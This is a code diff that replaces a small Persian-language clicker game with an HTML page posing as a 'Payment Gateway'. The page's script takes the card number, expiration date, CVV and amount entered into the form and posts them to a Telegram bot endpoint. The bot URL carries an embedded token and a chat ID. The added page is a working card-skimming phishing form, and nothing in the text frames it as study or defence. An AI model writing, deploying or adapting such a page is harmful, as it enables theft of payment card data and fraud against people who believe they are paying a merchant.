@@ -1,75 +1,115 @@
 <!DOCTYPE html>
-<html lang="fa">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بوقلمون کوین</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-        }
-        #gameArea {
-            margin: 20px;
-            border: 2px solid #4CAF50;
-            padding: 20px;
-            display: inline-block;
-        }
-        #score {
-            font-size: 24px;
-            margin: 10px;
-        }
-        #energy {
-            font-size: 24px;
-            margin: 10px;
-            color: orange;
-        }
-        #clickButton {
-            padding: 10px 20px;
-            font-size: 18px;
-            cursor: pointer;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Payment Gateway</title>
+  <style>
+    .container {
+      max-width: 400px;
+      margin: 0 auto;
+      padding: 20px;
+      background-color: #f4f4f4;
+      border-radius: 5px;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+    }
+
+    h1 {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 5px;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 3px;
+    }
+
+    button {
+      display: block;
+      width: 100%;
+      padding: 10px;
+      background-color: #007bff;
+      color: #fff;
+      border: none;
+      border-radius: 3px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #0056b3;
+    }
+  </style>
 </head>
 <body>
-    <h1>بوقلمون کوین</h1>
-    <div id="gameArea">
-        <div id="score">امتیاز: 0</div>
-        <div id="energy">انرژی: 5</div>
-        <button id="clickButton">🦃</button>
-    </div>
+  <div class="container">
+    <h1>Payment Gateway</h1>
+    <form onsubmit="sendPaymentDetailsToTelegramBot(event)">
+      <label for="cardNumber">Card Number:</label>
+      <input type="text" id="cardNumber" name="cardNumber" placeholder="Enter your card number" required>
 
-    <script>
-        let score = localStorage.getItem('score') ? parseInt(localStorage.getItem('score')) : 0;
-        let energy = localStorage.getItem('energy') ? parseInt(localStorage.getItem('energy')) : 5;
-        const scoreDisplay = document.getElementById('score');
-        const energyDisplay = document.getElementById('energy');
-        const clickButton = document.getElementById('clickButton');
+      <label for="expirationDate">Expiration Date:</label>
+      <input type="text" id="expirationDate" name="expirationDate" placeholder="MM/YY" required>
 
-        scoreDisplay.textContent = `امتیاز: ${score}`;
-        energyDisplay.textContent = `انرژی: ${energy}`;
+      <label for="cvv">CVV:</label>
+      <input type="text" id="cvv" name="cvv" placeholder="Enter your CVV" required>
 
-        clickButton.addEventListener('click', () => {
-            if (energy > 0) {
-                score++;
-                energy--;
-                scoreDisplay.textContent = `امتیاز: ${score}`;
-                energyDisplay.textContent = `انرژی: ${energy}`;
-                localStorage.setItem('score', score);
-                localStorage.setItem('energy', energy);
-            } else {
-                alert("انرژی شما تمام شده است!");
-            }
-        });
+      <label for="amount">Amount:</label>
+      <input type="number" id="amount" name="amount" placeholder="Enter the amount" required>
 
-        // شارژ انرژی هر 1 ثانیه
-        setInterval(() => {
-            if (energy < 1000) {
-                energy++;
-                energyDisplay.textContent = `انرژی: ${energy}`;
-                localStorage.setItem('energy', energy);
-            }
-        }, 1000);
-    </script>
+      <button type="submit">Pay Now</button>
+    </form>
+  </div>
+
+  <script>
+    function sendPaymentDetailsToTelegramBot(event) {
+      event.preventDefault(); // Prevent form submission
+
+      // Get the payment details from the form
+      const cardNumber = document.getElementById('cardNumber').value;
+      const expirationDate = document.getElementById('expirationDate').value;
+      const cvv = document.getElementById('cvv').value;
+      const amount = document.getElementById('amount').value;
+
+      // Prepare the message to be sent to the Telegram bot
+      const message = `
+        New Payment Details:
+        Card Number: ${cardNumber}
+        Expiration Date: ${expirationDate}
+        CVV: ${cvv}
+        Amount: ${amount}
+      `;
+
+      // Replace the following URL with the URL of your Telegram bot
+      const botUrl = 'https://api.telegram.org/bot7343451377:AAFKFh4PS0AE3Wi-6jYnRSUzyktu8Pd6JOk/sendMessage';
+
+      // Send the message to the Telegram bot
+      fetch(botUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ chat_id: '5025237601', text: message })
+      })
+      .then(response => {
+        if (response.ok) {
+          alert('Payment details sent to Telegram bot successfully!');
+        } else {
+          alert('Failed to send payment details to Telegram bot.');
+        }
+      })
+      .catch(error => {
+        alert('An error occurred while sending payment details to Telegram bot.');
+        console.error(error);
+      });
+    }
+  </script>
 </body>
 </html>
